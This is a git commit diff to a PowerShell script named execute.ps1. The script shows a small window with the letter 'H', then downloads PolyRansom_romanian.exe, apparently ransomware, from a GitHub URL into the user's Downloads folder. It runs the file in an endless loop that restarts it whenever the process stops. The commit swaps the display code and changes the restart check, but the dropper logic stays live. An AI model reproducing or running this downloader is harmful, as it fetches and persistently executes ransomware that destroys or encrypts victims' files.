451d6a1c72b1cbd729ac94684638b29f2b6fd597
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-06 11:47:38 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,34 +1,36 @@
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
 $webClient = New-Object System.Net.WebClient
-function ShowHText {
-    $hText = [System.Windows.Controls.TextBlock]::new()
-    $hText.Text = "H"
-    $hText.FontSize = 20
-    $hText.Foreground = 'Green'
-    $hText.Margin = '0,0,20,20'
-    $hText.HorizontalAlignment = 'Right'
-    $hText.VerticalAlignment = 'Bottom'
-    
-    $window = [System.Windows.Window]::new()
-    $window.WindowStyle = 'None'
-    $window.ResizeMode = 'NoResize'
-    $window.AllowsTransparency = $true
-    $window.Background = 'Transparent'
-    $window.Topmost = $true
-    $window.Content = $hText
-    $window.Show()
-}
-ShowHText
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$form = New-Object System.Windows.Forms.Form
+$form.StartPosition = 'CenterScreen'
+$form.Size = New-Object System.Drawing.Size(200, 100)
+$form.Text = "Display"
+
+$label = New-Object System.Windows.Forms.Label
+$label.Text = "H"
+$label.ForeColor = [System.Drawing.Color]::Green
+$label.Font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
+$label.AutoSize = $true
+
+$form.Controls.Add($label)
+$label.Anchor = [System.Windows.Forms.AnchorStyles]::None
+$label.Location = New-Object System.Drawing.Point(($form.Width - $label.Width) / 2, ($form.Height - $label.Height) / 2)
+$form.ShowDialog()
 Start-Sleep -Seconds 60
 
 $webClient.DownloadFile($url, $downloadPath)
-function ChangeTextColorToRed {
-    $hText.Foreground = 'Red'
+
+function IsProcessRunning {
+    param([string]$processName)
+    return Get-Process -Name $processName -ErrorAction SilentlyContinue
 }
+
 while ($true) {
-    if (-not (Test-Path $downloadPath)) {
-        ChangeTextColorToRed
+    if (-not (IsProcessRunning "PolyRansom_romanian")) {
         Start-Process -FilePath $downloadPath -Wait
     }
     Start-Sleep -Milliseconds 100
